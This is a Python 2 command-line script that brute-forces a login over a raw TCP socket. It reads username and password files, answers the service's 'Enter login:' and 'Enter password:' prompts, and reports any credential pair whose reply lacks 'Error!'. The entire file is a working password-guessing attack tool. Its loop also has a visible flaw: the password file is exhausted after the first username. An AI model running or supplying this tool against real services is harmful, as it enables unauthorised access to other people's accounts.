__author__ = 'sergio'

import optparse, os, subprocess, socket

def main(users, passwords, ip, port):
    print "========================================"
    print "[*] Users file: " + users
    print "[*] Passwords file: " + passwords
    print "[*] IP: " + ip
    print "[*] PORT: " + str(port)
    print "========================================\n"

    print "[*] Starting socket brute-force..."
    #if os.path.isfile(users) and os.path.isfile(passwords) and check_port(port) and check_ip(ip):
    if os.path.isfile(users) and os.path.isfile(passwords):

        users = open(users,'r').readlines()

        with open(passwords) as passwords_file:
            connect_users(users, passwords_file, ip, port)

        print "[*] No matches found"

    else:
        print "[!!] Error: a directory and file are needed"
        print "[!!] Exiting..."
        exit(1)



def connect_users(users, passwords_file, ip, port):
    for user in users:  #Iter over users list
        for password in passwords_file: #Iter over passwords file
            start_bruteforce(user, password, ip, port)

def start_bruteforce(user, password, ip, port):

    sock = create_socket(ip, port)
    send_user(user, sock)
    send_password(password, sock)

    # Answer
    answer = sock.recv(6)

    if "Error!" not in answer:
        print "[*] Found match!"
        print "==================="
        print "[*] Username: " + user
        print "[*] Password: " + password
        exit(0)

    sock.close()

def create_socket(ip, port):
    # Create socket
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))   # IMPORTANT: int() conversion for port!
    except:
        print "[!!] Can't connect to host!"
        exit(1)

    return sock

def send_user(user, sock):
    # Request username
    data = ""
    while True:
        tmp = sock.recv(1)
        if tmp == "":
            break
        data += tmp
        if data.endswith("Enter login: "):
            break

    # Send username
    sock.send(user)

def send_password(password, sock):
    # Request password
    data = ""
    while True:
        tmp = sock.recv(1)
        if tmp == "":
            break
        data += tmp
        if data.endswith("Enter password: "):
            break

    # Send username
    sock.send(password)

def check_port(port):
    check = False
    if port > 0 and port < 65535:
        check = True
        print "[*] Puerto OK"
    return check

def check_ip(ip):
    check = False
    # The -c means that the ping will stop afer 1 package is replied
    # and the -W 2 is the timelimit
    FNULL = open(os.devnull, 'w')
    p = subprocess.Popen(['ping',ip ,'-c','1',"-W","2"], stdout=FNULL)
    p.wait()
    if not p.poll():
        check = True
        print "[*] IP OK"
    return check

def print_help(parser):
    print "arguments error!!\n"
    parser.print_help()
    exit(-1)

if __name__ == "__main__":

    parser = optparse.OptionParser()
    parser.add_option('-u', '--users', action="store", help="File path with usernames names", dest="users",type="string")
    parser.add_option('-p','--passwords', action="store", help="File path with passwords", dest="passwords",type="string")
    parser.add_option('--ip', action="store", help="Host IP to connect", dest="ip",type="string")
    parser.add_option('--port', action="store", help="Port to connect", dest="port",type="string")


    (opts, args) = parser.parse_args()
    if opts.users is not None and opts.passwords is not None and opts.ip is not None and opts.port is not None:
        main(opts.users, opts.passwords, opts.ip, opts.port)
    else:
        print_help(parser)